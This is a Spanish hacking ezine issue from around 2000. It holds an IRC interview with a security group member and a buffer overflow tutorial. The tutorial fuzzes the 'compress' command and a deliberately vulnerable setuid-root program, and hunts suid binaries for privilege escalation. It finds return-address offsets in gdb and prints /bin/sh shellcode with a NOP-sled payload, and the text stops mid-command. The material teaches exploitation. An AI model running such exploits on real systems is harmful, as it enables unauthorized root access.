* Asi es Windows 2000 Server. Ed. Mac Graw Hill, 1999 Madrid


-- |CoDeX| -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- --
-- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x10 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ En contacto con AViNash (dSR) ]-=========================================
=-[ por NetSearch ]-=========================================================




Holas. Como podreis ver a partir de este numero del Ezine hemos decidido
incluir una nueva seccion, la cual estais leyendo ahora :). Con esta seccion
intentaremos acercar un poco mas el mundo hispano de la seguridad
informatica en general, asi como ayudar a que todos nos conozcamos un poco
mejor. Resumiendo, la seccion constara de un articulo a modo de 'entrevista'
con algun personajillo de este mundillo ;). Puede que a alguna gente no le
guste que en el Ezine se incluya un apartado de este tipo.. Yo personalmente
siempre vi muy interesante el hecho de conocer un poco a mas a la gente;
cosas como sus comienzos.. sus opiniones.. etc. Por lo tanto, si el unico
motivo para no incluir esta seccion era que otro Ezine que todos conocemos
la habia sacado primero.. que quereis que os diga?.. no lo veo una razon de
peso ni mucho menos. Asi que nada.. tenemos nueva seccion ;). Bueno.. y
ahora que hemos aclarado algunas dudas empecemos con la seccion en si.

En este numero conoceremos un poco mas a aViNash, uno de los miembros
fundadores del antiguo 2500Hz (http://pagina.de/2500Hz), y miembro actual de
dSR, Digital Security Research (http://www.digitalsec.net). La entrevista
fue realizada en el irc por RaiSe, o sea yo ;). Aqui la teneis..

  
### Log session started at Thu Nov 23 2000 ###


<RaiSe> bueno,podemos empezar :)

<aViNash> pos ale amos al lio

<RaiSe> empezamos con una serie de preguntas personales,oki? :)

<aViNash> enga

<RaiSe> a ver
<RaiSe> cuentanos un poco como te trata la vida.. edad, ciudad, estudias,
        trabajas..

<aViNash> bueno... tengo 19 años, soy del sur y ahora mismo estoy en el
          cyber. Mis estudios terminaron pronto, en 8 curso. Hacia falta
          dinero en casa y tube k pornerme a currar. Me hubiese gustao mucho
          seguir estudiando. En cuanto a trabajo, como ya dije, estoy
          currando en un ciber, administrandolo. Llevo un server en linux y
          me encargo de k todo funcione adecuadamente configuracione, etc.

<RaiSe> curras muchas horas diarias?

<aViNash> no muchas.. pero si me llevo aki todo el dia enganchao, eso de 
          tener conexion gratis.. :)

<RaiSe> :)
<RaiSe> mm..cuentanos un poco como empezaste con esto de los ordenadores..

<aViNash> mmm, bueno.... recuerdo k a eso de los 14 años me compre mi 
          propia makina xD, me lleve tres meses currando para poder
          hacerme  con ella. Era un p200mmx, 16 de ram.. ahora mismo estoy
          tecleando desde el ;). Es una maravilla, tengo aki a mi lao un
          pIII a 550, pero como mi niña no hay nada ;).

<RaiSe> cuando empezaste y como..
<RaiSe> con esto del hacking?

<aViNash> en esto del hacking.. recuerdo mis primeras andaduras con
          codex, nuestro primer contacto con internet. jajajaja, todavia 
          rio cuando recuerdo dicho contacto. Nos banearon de un canal y  
          pensamos k el tio era el rey. bueno.... a mi por lo menos
          siempre me gusto el tema, aunque nunca me considerare un
          hacker, esa palabra esta tan deteriorada, k muchas veces dudo
          de su significado.

<RaiSe> ahap..cuentanos un poco como se formo 2500Hz

<aViNash> bueno... maravillosos años. la idea de 2500Hz surgio de las  
          cabezas de codex y de mi con la intencion de tener un grupo de
          gente con las k krecer en conocimientos, compartir ideas.... al  
          igual k ampliarlas, pero ante todo, un grupo de amigos con algo
          en comun, las makinas y la idea de aprender como funcionan.

<RaiSe> quienes 'formabais' 2500Hz, y durante cuanto tiempo estuvo 
        'funcionando'?

<aViNash> bueno... el tiempo en si no lo recuerdo, creo k estuvimos unos 2
          años. lo formabamos codex, neuronal, crash, damnation, kay,
          junkee.. mmm, espera se me olvida el darth-vai, klonical y nuestro  
          kerido asejua. si... creo k no se me olvida nadie. si es asi pido  
          perdon, mi cerebro es pekeño.

<RaiSe> fruto de 2500Hz salio un Ezine,nop?..

<aViNash> si, esacto. En un principio no gustaba mucho la idea, pero... poko
          a poko.. fue lo ke, de alguna manera, nos dio un impulso y nos  
          dimos a 'conocer'. Sacamos 2 numeros en total.

<RaiSe> ahora cuentanos un poco, como surgio dSR (Digital Security
        Research).. 

<aViNash> bueno... dSR fue una idea en la cual me lleve pensado mucho
          tiempo, 2500Hz se me moria y tenia k hacer algo. Por akella epoka
          konoci a un tio cojonudo, craig, al cual propuse la idea de 
          fusionar dos grupos, 2500Hz y E-N-G!, y empezar de nuevo. Nuevas
          ideas.... proyectos, y un sin fin de posibilidades nuevas. En
          e-n-g estaba gente como craig, doing, badbash, icefire,ireick..
          Todas personas cojonudas, las cuales tengo oportunidad ahora de
          conocer un poko mejor.

<RaiSe> y como fue la union de e-n-g y 2500Hz?

<aViNash> en un principio.... mal XDD. Nada de lo planeaba se hacia
          realidad, estubimos casi por dejarlo, pero bueno... gracias a la
          comprension de todos... hicimos tal cosa.. creamos dSR :).

<RaiSe> y cual es la idea de dSR.. como grupo me refiero. Es decir, escribir  
        docs.. programas.. un poco de todo..

<aViNash> la base es la misma, seguir aprendiendo. Tenemos muchos proyectos
          en mente: charlas internas, documentacion, traduccion, y un largo
          etc. Acabamos de empezar con este nuevo proyecto. Casi todos
          andamos liaos, si no con estudios con el trabajo, y la verdad.. 
          tenemos poko time para dedicarle al grupo. Esperamos poko a poko 
          ir en aumento, pero... eso tambien lo dira el time.

<RaiSe> quienes formais ahora mismo dSR?

<aViNash> somos una gran familia. Lo formamos bastantes, ocuparia varios  
          renglones. Eso lo dejamos... dentro de poko tendreis en la
          web el nombre de todos los componentes ;).

<RaiSe> ok.. como ves el panorama del hacking hispano actualmente?

<aViNash> bueno... actualmente hay mucha actividad, no para de salir gente  
          nueva k promete mucho.. muchos grupo nuevos, nuevas ideas, etc.
          Lo importante de todo esto es aprender con cada cosa que haces.
	  Yo creo que cuando deje de tener interes por aprender cosas
          nuevas, es decir, me quede estancado, me retirare de todo esto, ya
          que eso es principalmente lo que me motiva a hacer cosas y a
          seguir adelante. En realidad pienso que eso, de una u otra forma,
          es lo que nos motiva a todos..

<RaiSe> Bueno.. pues eso es todo, un poco corta pero bueno.. a que no ha
        sido tan terrible? :)

<aViNash> nop ;). Pues venga.. solo me keda agradeceros que os hayais
          interesado en dSR, y mandarles un saludo a todos desde aqui. Ah, 
          y un beso para Era xD.

<RaiSe> Venga, pues ha sido un placer ;), nos vemos por el irc. Un saludo.

<aViNash> Igualmente, un saludo para todos/as.


### Log session closed at Thu Nov 23 2000 ###


Pues nada, eso es todo, solo saludar desde aqui a avi y darle las gracias
por permitirnos esta 'entrevista' ;). Un saludo a tod@s.



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x11 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ Buffer Overflows (b0f's) ]-==============================================
=-[ por kekabron ]-==========================================================




	1.- Introduccion.

Hola, soy bastante nuevo en este mundo de escribir articulos asi que
qespero que no os resulte muy pesado, recomiendo sobre todo este texto para
aquellos que lo intentaron leyendo buenos documentos como el texto de aleph
one y fracasaron bien porque no sabian C o por lo que fuera. Espero que
os guste. Este documento no es una copia de ningun otro documento aunque no
añada nada nuevo, es algo que me ha salido espontaneamente. Todos los
conceptos importantes seran explicados de tal forma que se pueda tener una
idea basica(para profundizar un poco mas mirar el documento sobre buffer
overflows escrito por RaiSe en la primera epoca. Voy a explicar lo mas
mundanamente posible como explotar un buffer overflow comun y como
encontrarlos(esto depende de la astucia de cada uno, es decir que no todos
los dias se encuentran b0f's).

	2.- ¿ Que es ? ¿ Porque se producen ?...

La verdadera razon de que existan b0f's es que a ciertos programadores
(pobrecillos no tienen la culpa de que se les olvide hacer una pequeña
rutina que mida el tamaño de las variables para que cuando hay una variable
grande y otra variable pequeña no se meta la grande en la pequeña) se les
olvida chequear el tamaño de las variables(puede ser tanto texto como
numeros o lo que querais). Si por alguna razon se mete en un sitio mas de lo
que cabe nos podemos imaginar lo que va a pasar: el objeto donde se esta
metiendo algo no tiene mas capacidad para albergar mas materia. Pues bien el
los b0f pasa algo asi, se copia una variable en otra variable y el medio
para copiarlas es la pila y la pila cotiene datos importantes que si son
sobrescritos no se sabe que es lo que puede pasar(mmm no se sabe??? yo creo
que si xD). 

La pila es un segmento que sirve para acceder rapidamente a las variables
alojadas por los programas en ella, ademas de variables locales contienen
otro tipo de datos como puede ser el puntero base(ebp), el puntero que
indica la situacion actual de la pila(esp) y el registro que contiene la
direccion de la siguiente instruccion que se va a ejecutar(eip o ret). Pues
bien en la pila las variables locales se supone que estan entre el esp y el
ebp, despues del ebp esta la direccion de retorno(ret). Como sabemos los
programas estan estructurados en procedimientos o en funciones, pues bien
cada funcion tiene su propia direccion de retorno y su propio puntero base
salvado donde se guarda la direccion de las variables de la funcion anterior
para que cuando la funcion vuelva sepa donde estan las variables de esa
funcion. Con todo esto en mente vamos a ver lo que pasaria si tenemos un
espacio de memoria reservado para las variables locales de una funcion de 20
bytes, pues bien, con tal de que le pasemos a la funcion vulnerable 21 bytes
va a producirse una exepcion en el sitema, va a producirse lo que se llama
una violacion de segmento y el programa ejecuntandose finalizara dando el
mensaje de violacion de segmento: Segmentation fault (core dumped).
Explicado esto, empecemos a jugar un poco con la memoria :).

	3.- Buscando b0f's

Si un programa hace una salida de violacion de segmento es porque algo ha
ido mal en el programa, posiblemente sea una variable que sea metida en otra
variable de menor tamaño, esto sucede muy a menudo y en la actualidad se dan
aunque es muy dificil encontrarlos. El hecho de que una variable sea copiada
en otra quiere decir que o bien nosotros hemos metido un argumento muy
grande o que el programa esta mal depurado(perdonarme programadores). Si el
argumento se lo hemos pasado nosotros seguro que el programa lo ha cogido
desde stdin(entrada estadar) mediante alguna funcion tipo gets, read... o
algo por el estilo y lo ha almacenado en su correspondiente variable. Hay
veces que el programa nos da un segmentation fault porque lo que ha entrado
a traves de stdin es mas grande que la variable asignada a la funcion que
recoge los datos de stdin aqui tambien hay una violacion de segmento. Como
el caso que nos ocupa ahora es mas simple, lo anterior se deja de lado y nos
vamos a centrar en los b0f's normales de toda la vida. Cojamos este programa
como ejemplo:

--------- ejemplo.c --------

 main(int argc, char **argv)
 {
 char variable[512];
 if (argc != 2)
 {
 printf("uso: %s cadena\n",argv[0]);
 exit(0);
 }
 strcpy(variable, argv[1]);
 }

----------------------------

Supongo que no habra muchas dudas de lo que hace este programa pero por si
acaso no lo habeis pillado bien os digo que este programa coge el primer
argumento pasado al programa y lo copia en variable. Si variable es mayor de
500 bytes se producira un segmentation fault (si no se actua como se tiene
que actuar). Cogemos nuestro editor de textos preferido y escribimos el
archivo ejemplo.c o bien se podria hacer asi tambien:

[root@info b0f]# cat > ejemplo.c
 main(int argc, char **argv)
 {
 char variable[512];
 if (argc != 2)
 {
 printf("uso: %s cadena\n",argv[0]);
 exit(0);
 }
 strcpy(variable, argv[1]);
 }
^C
[root@info b0f]#

El ultimo caracter impreso es Control + c. Ahora compilamos el programa:

[root@info b0f]# gcc -o ejemplo ejemplo.c
[root@info b0f]# whoami
root
[root@info b0f]# chmod 04755 ejemplo
[root@info b0f]# ls -la ejemplo
-rwsr-xr-x   1 root     root        12325 Nov  3 18:33 ejemplo

Veis la s? pues es una pura simulacion de un archivo que puede ser suid. El
que un archivo sea suid y pertenezca al usuario root y en el que se tengan
permisos de ejecucion quiere decir que cuando lo ejecutes lo haras como si
fueras root, momentaneamente tus privilegios se suben al de root y aqui esta
la cuestion: en aprovecharte de ello :). Para encontrar en un sistema los
suid's que hay de root haremos lo siguiente:

[root@info b0f]# find / -perm 4755 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/bin/ping
/bin/login
/bin/su
/home/kekabron/b0f/ejemplo
/sbin/cardctl
/usr/bin/at
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/disable-paste
/usr/bin/rcp
/usr/bin/rlogin
/usr/bin/rsh
/usr/bin/crontab
/usr/sbin/usernetctl
/usr/sbin/traceroute
/usr/sbin/userhelper
/usr/libexec/pt_chown

Bien una vez hecho esto sabemos que archivos tienen suid de root y por lo
tanto cuales cobran privilegios de root cuando se ejecutan. Lo ideal seria
ir probando uno a uno, mirando el man: man comando o bien pidiendo la ayuda
del programa, esto normalmente se hace asi: comando --help. Una vez que
sabemos para que sirve y su utilizacion, pasamos a la accion pasamos a ver
comando a comando introduciendole una cadena muy larga. La cadena larga
puede ser lo que quieras y esto lo hacemos para buscar un posible b0f.

Por ejemplo un comando que aunque no es suid pero que si que esta presente
en la mayoria de las distribuciones linux y que es vulnerable a los buffer
overflows es el comando compress(la distribucion rh 7.0 tambien es
vulnerable guaU!! no se han preocupado en mejorar la version...). Para
desmotraros a vosotros mismos que este comando es vulneble haced lo
siguiente:

[kekabron@info /root]$ compress `perl -e 'printf "A"'x9000`
Segmentation fault

Ahora lo unico que hay que hacer es ver si realmente sobreescribimos eip,
esto lo hacemos asi:

[kekabron@info b0f]$ gdb -q
(gdb) file compress
Reading symbols from compress...(no debugging symbols found)...done.
(gdb) set args `perl -e 'printf "A"x1100'`
(gdb) r
Starting program: /usr/bin/compress `perl -e 'printf "A"x1100'`
/bin/bash: /root/.bashrc: Permission denied
....... muchas A'es: File name too long
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info all-registers
     eax:      0x461        1121
     ecx: 0x401012a7  1074795175
     edx:        0x0           0
     ebx: 0xbffff95c -1073743524
     esp: 0xbffff8f0 -1073743632
     ebp: 0x41414141  1094795585
     esi: 0xbffffa47 -1073743289
     edi:  0x804a8cc   134523084
     eip: 0x41414141  1094795585
     .....................
     .....................

Bien como hemos visto estamos sobreescribiendo ret con A'es, ahora lo unico
que hay que hacer es averiguar el tamaño de la variable local que soporta a
esta cadena que introducimos nosotros de tal forma que escribiendo ese
tamaño y a su vez 8 bytes mas que ocupan ebp y ret podamos tener nuestro
buffer formateado y listo para desbordar el buffer.

Para averiguar el tamaño de la variable local sigamos probando con el gdb,
vamos a cambiar el numero de A'es hasta que veamos que se sobreescribe
exactamente hasta la direccion de retorno, esto es 8 bytes despues de la
variable local que se esta intentando explotar. Despues de muchos intentos
obtenemos que:

(gdb) set args `perl -e 'printf "A"x1032'`
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/bin/compress `perl -e 'printf "A"x1032'`
....... muchas A'es: File name too long
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)

Para estar seguros de que hemos acertado con el numero de A'es pasemos a
sobreescribir la direccion de retorno con el valor que nosotros queramos,
por ejemplo 0x12345678, esto se hace asi:

(gdb) set args `perl -e 'printf "A"x1028'``printf "\x78\x56\x34\x12"`
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/bin/compress `perl -e 'printf "A"x1028'``printf "\x78\x56\x34
\x12"`
....... muchas A'es: File name too long
Program received signal SIGSEGV, Segmentation fault.
0x12345678 in ?? ()

Antes se me ha olvidado comentar que cuando despues de que el gdb da la
salida de Segmentation fault abajo nos muestra la direccion de retorno del
frame actual(un frame es un trozo de pila para una funcion). Si hacemos que
la direccion de retorno apunte a las A'es y si estas en vez de ser A'es son
nop's y a continuacion colocamos una shellcode resulta que podremos ejecutar
en la pila lo que queramos. El codigo de este exploit lo añado al final(lo
unico malo de este exploit es que no consigue elevar los privilegios del
usuario, simplemente es una muestra de que los buffer overflows existen
todavia y cuando menos te lo esperes puedes encontrar uno e ir presumiendo
de que lo has encontrado, que bien no ? jeje).

Volvamos al programa ejemplo.c. Cuando estamos explotando un buffer overflow
siempre hay una cadena que sera la que desborde el buffer, seguramente esta
cadena sera introducida por nosotros, por lo tanto tenemos que buscar la
variable que contendra nuestra cadena. Tenemos que ir viendo paso a paso lo
que el programa va haciendo con nuestra cadena y fijarnos muy bien cuando se
utiliza una funcion como strcpy ya que esto implica copiar nuestra cadena en
otra variable que estara en la pila. Mucho ojo con estas cosas ya que se dan
muy a menudo. El procedimiento es siempre el mismo; buscar la variable que
contendra nuestra cadena introducida y ver como la procesa el programa. En
nuestro ejemplo.c nuestra cadena estara en argv[1] y se copiara en variable
que es de 512 bytes.

Bien hemos visto lo que el programa hace con las variables y llegamos a la
conclusion de que hay un posible buffer overflow, como actuamos ?. Haremos
lo siguiente para comprobar que de verdad existe un buffer overflow:

[kekabron@info b0f]$ ./ejemplo `perl -e 'printf "A"'x1000`
Segmentation fault

Si ves el mensaje de segmentation fault posiblemente haya buffer overflow
explotable, pero no cantemos victoria... tenemos que poder sobreescribir
ret. Os dejo como hacer lo que he hecho antes para ver si pisamos ret.

Si el programa ejemplo hubiera cogido la entrada del buffer desde el
programa nuestra cadena se la habriamos pasado asi:

[kekabron@info b0f]$ ./ejemplo < `perl -e 'printf "A"'x1000`

De momento nada mas sobre esto.

	4.- Como explotar un buffer overflow desde el shell


Mucha gente se estara preguntando: como? estas loco? pues no no estoy loco
y resulta que para poder explotar un buffer overflow ni muchisimo menos hay
que tener grandes conocimientos ni en C ni en ensamblador(para saber lo que
se hace si, hay una diferencia entre explotarlo y saber lo que estas
haciendo), solo hay que ser un poco pillo. La mayoria de la gente tambien se
preguntara ahora: bah!! esto no lo voy a necesitar en la vida... imaginate
que estas en un sistema en el cual no hay compilador, por lo que no vas a
poder compilar el codigo que normalmente viene en C! mucha gente se
preguntara que hago? otros diran muy facil con perl!! Si exacto con perl y
la sintaxis es muy sencilla, basta con hechar un ojo al man de perl. Perl
tiene una opcion -e que permite ejecutar comandos desde el interprete de
comandos(la shell), por lo que esta opcion nos va a ser de gran ayuda a la
hora de colocar nop's. 

La direccion de retorno y la shellcode la colocaremos a mano con printf y lo
podemos hacer de dos formas: o bien directamente o bien pasando miembro a
miembro de nuestro buffer formateado a las variables de entorno. Las
variables de entorno son como su nombre indica variables que tenemos
disponibles en una sesion y podemos ver las que hay en el sistema en un
momento determinado usando el comando set. ¿Como se declara una variable de
entorno? si estamos utilizando tanto el shell bash como sh podremos utilizar
el comando export, su sintaxis es: export nombre_variable_de_entorno=valor,
una vez declarada la variable de entorno la tenemos a nuestra disposicion en
esa sesion colocando el signo de dolar($) y acontinuacion el nombre de la
variable de entorno, por ejemplo:

[kekabron@info b0f]$ export variable=hola
[kekabron@info b0f]$ set | grep variable
variable=hola
[kekabron@info b0f]$ echo $variable
hola

La sintaxis de printf es tambien muy sencilla y esta tambien en el
interprete de comandos, es un comando mas igual que perl, no es ninguna
funcion de C ni nada por el estilo. Para imprimir una cadena utilizaremos
printf de esta forma:

[kekabron@info b0f]$ printf "\x48\x4f\x4c\x41\n"
HOLA

Como habeis podido comprobar ahora he introducido HOLA pero de una manera un
tanto particular: he utilizado la nomenclatura hexadecimal en vez de la
decimal para que cuando pongamos una direccion de retorno la metamos asi,
pero en vez de al derecho como hemos hecho con HOLA, lo he puesto al reves.
Esto es porque la pila tiene una estructura un tanto extraña y hay que
colocar las direcciones al reves.

Nuestro buffer formateado al pasarlo al programa tendra la siguiente
estructura:  [ muchos nop's ] [ shellcode ] [ ret ] [ ret ].

 nop = no operation, con esto hacemos que se vaya saltando por la memoria
       hasta llegar a la shellcode. Digamos que rellenan el buffer y no
       hacen nada.
 
 shellcode = codigo en asm de lo que queremos ejecutar pasado a hexadecimal,
             ya que para que podamos explotar un buffer overflow desde el
             interprete de comandos tiene que estar en hex(hexadecimal).
 
 ret = direccion de retorno, la metemos dos veces porque despues de las
       variables de entorno esta el ebp de la funcion y luego la direccion
       de retorno(esto puede ser un poco lioso pero internamente la pila es
       asi). En realidad en ebp, en nuestra situacion, da igual lo que 
       pongamos porque la funcion va a saltar a la direccion que apunte en
       ret no en ebp.

He de comentar que la forma aqui expuesta no es nada extraña, en C
normalmente tambien se formatea el buffer para que tenga la misma
estructura, solo que hay que añadir un par de lineas mas y un par de bucles.
Lo unico que realmente creo que sea molesto es añadir la shellcode y
calcular su tamaño, en cuanto a lo demas esta tirado, es coser y cantar ya
que el tamaño de los nop's los vamos a poner nosotros con perl y el tamaño
de ret es de 4 bytes por lo que despues de la shellcode habran 8 bytes, es
decir dos palabras(una palabra son 4 bytes = 32 bits). Pasemos a la accion,
imaginemos que no tenemos compilador y que el programa a explotar es este:

---------- programa.c ---------------

main(int argc,char **argv)
{
 char buffer[1000];
 if(argc != 2)
 {
 printf("uso: %s cadena_formateada\n", argv[0]);
 exit(0);
 }
 strcpy(buffer, argv[1]);
}

--------------------------------------

Esta claro que tenemos que imaginar que no tenemos compilador pero habra que
compilarlo :). Esto lo haremos asi:

[root@info b0f]# gcc -o programa programa.c

Lo suideamos(fijaros en el id, soy root) para que cuando lo explotemos
podamos subir nuestro privilegios:

[root@info b0f]# chmod 4755 programa

Comprobamos que tiene el suid de root.

[root@info b0f]# ls -la programa
-rwsr-xr-x   1 root     root        11952 Nov  4 14:51 programa

Copiamos el archivo a /sbin o a /bin para que este en el path.

[root@info b0f]# cp programa /bin

	o bien:

[root@info b0f]# cp programa /sbin

Nos hacemos un usuario normal, con privilegios normales.

[root@info b0f]# su kekabron
[kekabron@info b0f]$ 

Cuando entramos en un sistema y queremos elevar nuestros privilegios de root
hay varias formas de hacerlo: mediante un bug de formato aprovechando que un
suid es vulnerable, mediante un programa que utilizan links(no es
exactamente pero bueno para que me entendais podria valer :)) y mediante
buffer overflows. Estos tres son los que mas se utilizan a parte de estos
hay algunos otros como puede ser sobreescribir punteros mediante la llamada
a free() (esto se puede hacer en ciertas ocasiones y es muy dificil de
llevar a cabo), los heap overflows y poco mas. Pues bien nosotros vamos a
ver los buffer overflows desde el interprete de comandos y para eso primero
vamos a formatear nuestra cadena que se le va a pasar al programa. Primero
vamos a pasar los nop's, luego la shellcode y por ultimo la direccion de
retorno a las variables de entorno. Pero primero vamos a ver como medimos la
longitud de nuestra shellcode para que acertemos a la hora de poner cierto
numero de nop's porque si se ponen mas de la cuenta habremos sobreescrito
mas alla de la direccion de retorno y es posible que el alineamiento haya
cambiado, por lo que la direccion de retorno no se habra sobreescrito
correctamente. Para que no nos pase esto vamos a medir la longitud de la
shellcode. Cogemos una de las muchas shellcodes que hay, por ejemplo:

    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
    "\xff\xff/bin/sh"

Bien una vez que hemos elegido una shellcode lo unico que tenemos que hacer
es medir su longitud en nuestro ordenador, esto lo vamos a hacer haciendo un
pequeñito programa en C como el que sigue:

----------------- lsc.c -------------------

main()
 {
 char shellcode[]=
 // aqui podeis poner vuestra propia shellcode
  "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
  "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
  "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
  "\xff\xff/bin/sh";
 // acordaros de añadir el punto y coma al final de la variable shellcode
 printf("La shellcode tienen una longitud de: %d bytes\n", strlen(shellcode));
 return(0);
 }

--------------------------------------------

Compilamos el programa y lo ejecutamos:

[kekabron@info b0f]$ gcc -o lsc lsc.c
[kekabron@info b0f]$ ./lsc
La shellcode tienen una longitud de: 48 bytes

Ahora, ejecutando el programa vamos a ver como tiene que ser el formato:

	Si lo ejecutamos a secas obtenemos el uso:

[kekabron@info b0f]$ programa
uso: programa cadena_formateada

Ahora le pasamos una cadena cualquiera con perl ya que nos facilita bastante
la tarea de estar cortando y pegando un caracter o bien dandole a la tecla
"x"  500 veces:

[kekabron@info b0f]$ programa `perl -e 'printf "A" x 500'`

Bien vemos que no pasa, vamos a pasarle A'es hasta que nos de una violacion
de segmento:

[kekabron@info b0f]$ programa `perl -e 'printf "A" x 700'`
[kekabron@info b0f]$ programa `perl -e 'printf "A" x 800'`
[kekabron@info b0f]$ programa `perl -e 'printf "A" x 900'`
[kekabron@info b0f]$ programa `perl -e 'printf "A" x 1000'`
[kekabron@info b0f]$ programa `perl -e 'printf "A" x 1100'`
Segmentation fault (core dumped)

Bien, sabemos que el tamaño de nuestra cadena de formato va a estar mas o
menos entre 1000 y 1100, veamos donde esta, siguamos probando:

[kekabron@info b0f]$ programa `perl -e 'printf "A" x 1050'`
Segmentation fault (core dumped)
[kekabron@info b0f]$ programa `perl -e 'printf "A" x 1020'`
Segmentation fault (core dumped)
[kekabron@info b0f]$ programa `perl -e 'printf "A" x 1010'`
Segmentation fault (core dumped)
[kekabron@info b0f]$ programa `perl -e 'printf "A" x 1005'`
Segmentation fault (core dumped)
[kekabron@info b0f]$ programa `perl -e 'printf "A" x 1004'`
Segmentation fault (core dumped)
[kekabron@info b0f]$ programa `perl -e 'printf "A" x 1003'`
[kekabron@info b0f]$

Es extraño, pero hemos sobreescrito 3 bytes del ebp y no se ha producido un
segmentation fault, ha sido cuando hemos ocupado su cuarto byte cuando se ha
producido. Bien esto es buena señal quiere decir que hemos encontrado el
punto donde esta ebp:  desde 1000 hasta 1004 y la direccion de retorno la
tenemos acontinuacion y ocupa tambien cuatro bytes, asi que si escribimos
1004+4=1008 A'es sobreescribiriamos la direccion de retorno con A'es:

	Si alguien duda que se sobreescriba la direccion de retorno haced lo
        siguiente:

	1) Compila programa.c 
	2) Corre el gdb: gdb 
	3) Dentro de gdb pones: file programa y le das a intro
	4) Dentro de gdb pones: set args `perl -e 'printf "A" x 1008'`
	5) Dentro de gdb corres el programa: run y le das a intro
	6) Pon info all-registers para ver el valor de los registros.

[kekabron@info b0f]$ gdb
GNU gdb 4.17.0.11 with Linux support
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
(gdb) file programa
Reading symbols from programa...done.
(gdb) set args `perl -e 'printf "A" x 1008'`
(gdb) r
Starting program: /usr/bin/programa `perl -e 'printf "A" x 1008'`

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info all-registers
     eax: 0xbffff5a0 -1073744480
     ecx: 0xfffffad4       -1324
     edx: 0xbffffebc -1073742148
     ebx: 0x401031b4  1074803124
     esp: 0xbffff990 -1073743472
     ebp: 0x41414141  1094795585
     esi: 0xbffff9d4 -1073743404
     edi:        0x2           2
     eip: 0x41414141  1094795585
     ...........
     ...........
     otra informacion que no nos interesa.	
(gdb) quit
The program is running.  Exit anyway? (y or n) y
[kekabron@info b0f]$

Si por lo que sea no podeis utilizar el gdb con este programa hacedlo como
root. Bueno espero que hayais salido de dudas no ? esta bien clarito todo.
Ahora solo queda aclarar lo de la direccion de retorno. Como sabeis, cuando
apuntamos con la direccion de retorno hacia nuestro codigo lo hacemos
apuntando antes de llegar a la shellcode(esto quiere decir que apuntamos a
los nop's, mientras apuntemos en el rango de memoria que esten los nop's
estaremos haciendolo correctamente ya que cuando el programa le ceda el
control a strcpy este se ira hacia la direccion y se encontrara con nop's y
se seguiran ejecutando hasta llegar a la shellcode), si la shellcode es de
48 bytes como hemos visto antes pues tenemos un margen de 1000 bytes - 48
bytes para apuntar con la direccion de retorno. Pasemos a ver como construir
la ret. Una forma de ver cual sera nuestra direccion de retorno es coger el
programa ltrace que viene con casi cualquier distribucion y ejecutarlo de
este modo:

[root@info b0f]# ltrace programa `perl -e 'printf "A"x1008'`
__libc_start_main(0x08048430, 2, 0xbffff9b4, 0x080482e0, 0x080484ac 
<unfinished ...>
__register_frame_info(0x080494f8, 0x080495d4, 0xbffff974, 0x08048305,
0x401031b4) 
= 0x40103ca0
strcpy(0xbffff580, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...) = 0xbffff580
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
 
	Veis el strcpy que se realiza copiando nuestra cadena puesta en el
        archivo?:

strcpy(0xbffff580, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...) = 0xbffff580

Pues bien lo que hace strcpy es copiar cadenas y si se copia tiene que haber
un origen y un destino: strcpy(destino, origen), creo que habeis dado en el
clavo. Si, el destino para copiar la cadena AAAAAAAA... es 0xbffff580, por
lo que a partir de aqui tenemos una referencia de donde se encuentran los
nops, en realidad es el principio de buffer. Debido a la estrutura de la
pila colocaremos la direccion de retorno al reves y para ello utilizaremos
printf desde el interprete de comandos:

[kekabron@info b0f]$ printf "\x80\xf5\xff\xbf\n"
 oe'

Nota: el primer espacio de arriba es un nop(0x80) no un espacio(0x10).

 Ahora ya estamos en condiciones de dar formato a nuestra string ya que
sabemos que los nop's y la shellcode tienen que ocupar una longitud de 1000
bytes esto es 952 bytes para los nops y 48 bytes para la shellcode y despues
habra 8 bytes mas con la direccion de retorno repetida dos veces. Pasemos
cada cosa a las variables de entorno. Desde el shell sh o bash se hace con
export como hemos visto antes:
	
Primero metemos los nop's en una variable de entorno llamada NOPS, son 952
ya que cada nop=1byte:

[kekabron@info b0f]$ export NOPS=`perl -e 'printf "\x90" x 952'`

Acontinuacion metemos la shellcode en la variable de entorno SHELLC:

[kekabron@info b0f]$ export SHELLC=`printf "\xeb\x22\x5e\x89\xf3\x89\xf7
\x83\xc7\x07\x31\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08
